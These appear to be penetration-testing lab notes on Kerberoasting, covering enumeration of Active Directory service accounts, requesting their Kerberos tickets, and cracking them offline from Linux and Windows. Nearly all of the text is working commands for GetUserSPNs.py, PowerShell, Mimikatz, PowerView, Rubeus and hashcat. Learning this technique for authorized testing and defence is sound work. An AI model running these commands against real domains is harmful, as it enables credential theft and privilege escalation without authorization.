# Kerberoasting - from Linux
## Kerberoasting Overview

```ad-tldr
- This attack targets **SPN Accounts**. 
- Any domain user can request a Kerberos ticket for any service account in the same domain.
- All we need to perform a Kerberoasting attack is an account's password (clear-text or NTLM hash), a shell in the context of a domain user account, or SYSTEM level access on a domain-joined host.
- Domain accounts running services are often local administrators, if not highly privileged domain accounts.
- The ticket (TGS-REP) is encrypted with the service account NTLM hash, clear-text password can be obtained by subjecting it to offline-bruteforce attack.
- Service accounts are often configured with weak passwords to simplify administration.
```

---
## Kerberoasting - Performing the Attack

Depending on our position in the network, this attack can be performed in multiple ways:

- From a non-domain joined Linux host using valid domain user credentials.
- From a domain-joined Linux host as root after retrieving the keytab file.
- From a domain-joined Windows host authenticated as a domain user.
- From a domain-joined Windows host with a shell in the context of a domain account.
- As SYSTEM on a domain-joined Windows host.
- From a non-domain joined Windows host using [runas](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-r2-and-2012/cc771525\(v=ws.11\)) /netonly.
#### Several Tools can be used
- Impacket’s [GetUserSPNs.py](https://github.com/SecureAuthCorp/impacket/blob/master/examples/GetUserSPNs.py) from a non-domain joined Linux host.
- A combination of the built-in setspn.exe Windows binary, PowerShell, and Mimikatz.
- From Windows, utilizing tools such as PowerView, [Rubeus](https://github.com/GhostPack/Rubeus), and other PowerShell scripts.
## Performing the Attack
### Kerberoasting with GetUserSPNs.py
#### Listing SPN Accounts with GetUserSPNs.py

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
```
#### Requesting all TGS Tickets

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request
```
#### Requesting a Single TGS ticket

```sh
GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev
```
#### Cracking the Ticket Offline with Hashcat

```sh
hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt
```

---
# Kerberoasting - from Windows
## Kerberoasting - Semi Manual method
#### Enumerating SPNs with setspn.exe

```powershell
setspn.exe -Q */*
```

Next, using PowerShell we can request TGS tickets for an account and load them into memory. Once they are loaded into memory, we  can extract them using `Mimikatz`.
#### Targeting a Single User

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
```
#### Retrieving All Tickets Using setspn.exe

```powershell
setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }
```

Now that the tickets are loaded, we can use `Mimikatz` to extract the ticket(s) from `memory`.
## Extracting Tickets from Memory with Mimikatz

```powershell
mimikatz> base64 /out:true
mimikatz> kerberos::list /export
```

If we do not specify the `base64 /out:true` command, Mimikatz will extract the tickets and write them to `.kirbi` files.
#### Preparing the Base64 Blob for Cracking

```sh
echo "<base64 blob>" | tr -d \\n
```
#### Placing the Output into a File as .kirbi

```sh
cat encoded_file | base64 -d > sqldev.kirbi
```
#### Extracting the Kerberos Ticket using kirbi2john.py

```sh
python2.7 kirbi2john.py sqldev.kirbi
```
#### Modifiying crack_file for Hashcat

```sh
sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat
```
#### Cracking the Hash with Hashcat

```sh
hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt
```
## Automated / Tool Based Route
#### Using PowerView to Enumerate SPN Accounts

```powershell
Get-DomainUser * -spn | select samaccountname
```
#### Using PowerView to Target a Specific User

```powershell
Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat
```
#### Exporting All Tickets to a CSV File

```powershell
Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation
```

We can also use `Rubeus` to perform Kerbroasting even faster
#### Using the /stats Flag

```powershell
.\Rubeus.exe kerbroast /stats
```
#### Using the /nowrap Flag

```powershell
.\Rubeus.exe kerbroast /ldapfilter:'admincount=1' /nowrap
```

